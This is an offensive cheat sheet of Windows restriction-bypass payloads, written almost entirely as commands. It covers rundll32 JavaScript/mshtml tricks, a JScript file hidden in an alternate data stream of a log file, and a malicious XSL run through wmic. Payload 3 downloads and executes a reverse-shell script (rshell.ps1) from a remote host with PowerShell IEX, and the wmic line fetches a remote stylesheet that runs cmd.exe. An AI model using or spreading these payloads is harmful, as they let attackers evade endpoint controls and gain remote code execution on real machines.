# Bypass Restrication

### Bypass Windows Restriction

##### Loads and runs dynamic-link libraries (DLLs)

#### payload -1

```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert("nooranet")
```

#### payload -2

```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

#### payload -3

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -w 1 -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.46/rshell.ps1');")
```

#### payload -4

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

### javascript

Test.js

```javascript
var shell = new ActiveXObject("WScript.Shell"); 
var res = shell.Run("cmd.exe");
```

- Type test.js > splunk.log:test.js
- cscript splunk.log:test.js

### XSL Transform

Test.xsl

```xml
<?xml version='1.0'?>
<stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace"> 
<output method="text"/>
<ms:script implements-prefix="user" language="JScript"> 
<![CDATA[ 
var r = new ActiveXObject("WScript.Shell"); 
r.Run("cmd.exe"); 
]]> </ms:script> 
</stylesheet> 
```

- wmic process get brief /format:"http://192.168.1.46/test.xsl
